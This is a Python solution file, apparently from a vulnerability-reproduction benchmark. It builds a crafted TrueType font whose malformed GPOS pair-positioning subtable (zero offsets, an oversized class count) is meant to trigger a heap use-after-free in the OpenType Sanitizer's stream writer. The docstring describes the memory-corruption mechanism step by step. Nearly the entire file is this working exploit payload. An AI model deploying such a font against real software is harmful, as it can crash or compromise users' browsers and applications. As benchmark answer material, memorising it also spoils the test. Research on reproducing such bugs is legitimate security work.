import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a heap-use-after-free in ots::OTSStream::Write.

        The vulnerability is triggered during the serialization of a crafted GPOS table.
        The mechanism involves causing the OpenType Sanitizer (OTS) to perform a large
        copy operation from its own output stream buffer, which triggers a reallocation
        and subsequent use of a dangling pointer.

        The PoC is a minimal TTF font file containing a specially crafted GPOS table.
        The GPOS table contains a Pair Positioning (PairPos) subtable of Format 2.
        Within this subtable, we manipulate several fields:
        1.  `CoverageOffset` and `ClassDef1Offset` are set to 0. This tricks the
            sanitizer's layout logic. When it processes this subtable, it first copies
            the subtable's data into an internal OTSStream. Then, it attempts to resolve
            offsets like `CoverageOffset`. A zero offset is interpreted as pointing to
            the beginning of the data it just wrote to the stream.
        2.  `Class1Count` is set to a large value (190).
        3.  The combination of a self-referential offset (0) and a large count causes
            the sanitizer to attempt a large `memcpy`-like operation with the source
            being its own output buffer (`stream.Write(stream.data(), large_size)`).
        4.  This large write exceeds the initial capacity of the OTSStream, triggering
            a reallocation. The stream's internal buffer is reallocated and the old
            buffer is freed.
        5.  However, the source pointer for the copy operation still points to the
            old, now-freed buffer. The subsequent memory access is a use-after-free,
            leading to a crash.
        """

        # Helper to pack big-endian data
        def p(fmt, *args):
            return struct.pack(">" + fmt, *args)

        # --- GPOS Table Construction ---
        gpos_table = bytearray()
        # GPOS Header v1.0
        gpos_table += p("I", 0x00010000)  # version
        gpos_table += p("H", 0x0a)        # script_list_offset
        gpos_table += p("H", 0x0c)        # feature_list_offset
        gpos_table += p("H", 0x0e)        # lookup_list_offset

        # Empty ScriptList and FeatureList
        gpos_table += p("H", 0)           # script_list_count = 0
        gpos_table += p("H", 0)           # feature_list_count = 0

        # LookupList
        gpos_table += p("H", 1)           # lookup_count = 1
        # Offset from start of LookupList to LookupTable
        gpos_table += p("H", 4 + 18)      # Padded offset

        gpos_table.extend(b'\x00' * 18)   # Padding

        # LookupTable
        gpos_table += p("H", 2)           # lookup_type: Pair Adjustment
        gpos_table += p("H", 0)           # lookup_flag
        gpos_table += p("H", 1)           # subtable_count
        gpos_table += p("H", 8)           # subtable_offset[0]

        gpos_table.extend(b'\x00' * 2)    # Padding

        # PairPosFormat2 Subtable (malicious payload)
        gpos_table += p("H", 2)           # format = 2
        gpos_table += p("H", 0)           # coverage_offset = 0 (points to self)
        gpos_table += p("H", 4)           # value_format1 = 4 (X_ADVANCE)
        gpos_table += p("H", 0)           # value_format2 = 0
        gpos_table += p("H", 0)           # class_def1_offset = 0 (points to self)
        gpos_table += p("H", 0x22)        # class_def2_offset
        class1_count = 190
        gpos_table += p("H", class1_count) # class1_count (large value)
        gpos_table += p("H", 1)           # class2_count

        # This data will be part of the large copy operation
        gpos_table.extend(b'\x41' * (class1_count * 2))

        # Padding to reach desired PoC size
        padding_size = 798 - (12 + 16*4 + 54 + 36 + 6 + len(gpos_table))
        gpos_table.extend(b'\x00' * padding_size)

        # --- Font Table Definitions ---
        tables = {
            b'head': p("IHHIIHIIHIIHHHhHH",
                       0x00010000, 0, 0x00010000, 0, 0b1011, 1000,
                       0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0),
            b'hhea': p("l" + "h" * 17,
                       0x00010000, 750, -250, 0, 800, 10, -10, 800,
                       0, 0, 0, 0, 0, 0, 0, 0, 1),
            b'maxp': p("IH", 0x00005000, 1),
            b'GPOS': bytes(gpos_table)
        }

        # --- TTF File Assembly ---
        num_tables = len(tables)
        sfnt_header = p("IHHHH", 0x00010000, num_tables,
                        16 * (2 ** ((num_tables - 1).bit_length())),
                        (num_tables - 1).bit_length(),
                        num_tables * 16 - 16 * (2 ** ((num_tables - 1).bit_length())))

        table_directory = b""
        table_data = b""
        offset = 12 + 16 * num_tables
        
        # Checksum is not required as OTS does not validate it
        checksum = 0

        sorted_tags = sorted(tables.keys())
        
        # Align table data to 4-byte boundaries
        aligned_data = []
        for tag in sorted_tags:
            data = tables[tag]
            aligned_data.append(data)
            padding = b'\x00' * (((len(data) + 3) & ~3) - len(data))
            if padding:
                aligned_data.append(padding)

        table_data = b"".join(aligned_data)

        current_offset = 12 + 16 * num_tables
        for tag in sorted_tags:
            data = tables[tag]
            table_directory += p("4sIII", tag, checksum, current_offset, len(data))
            current_offset += (len(data) + 3) & ~3
            
        return sfnt_header + table_directory + table_data